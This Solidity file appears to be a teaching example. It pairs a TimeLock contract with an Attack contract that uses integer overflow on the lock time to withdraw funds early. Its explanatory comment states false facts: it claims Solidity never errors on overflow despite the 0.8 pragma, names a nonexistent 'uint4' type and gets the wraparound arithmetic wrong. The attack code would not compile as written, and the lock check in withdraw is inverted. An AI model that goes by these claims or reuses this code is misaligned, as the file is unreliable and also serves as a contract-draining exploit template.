//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

/*

    arthmetic 'overflow' in solidity :- if a given number exceeds the value stored by the variable, then solidity recounts from the starting
    uint4 :- (0,15) if we try assigning a number > 15 : let 18 then it is assigned as 3
    solidity doesnot give any errors during overflows
    it just passes things 

    arthmetic 'underflow' in solidity :- if a given number is less than the minimum number of the required type, then solidity recounts from the max number in the backward direction
 */

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] = msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "insufficinet funds");
        require(lockTime[msg.sender] >= block.timestamp, "time not elapsed");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    receive() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        timeLock.increaseLockTime(uint(-timeLock.lockTime(address(this))));
        timeLock.withdraw();
    }
}
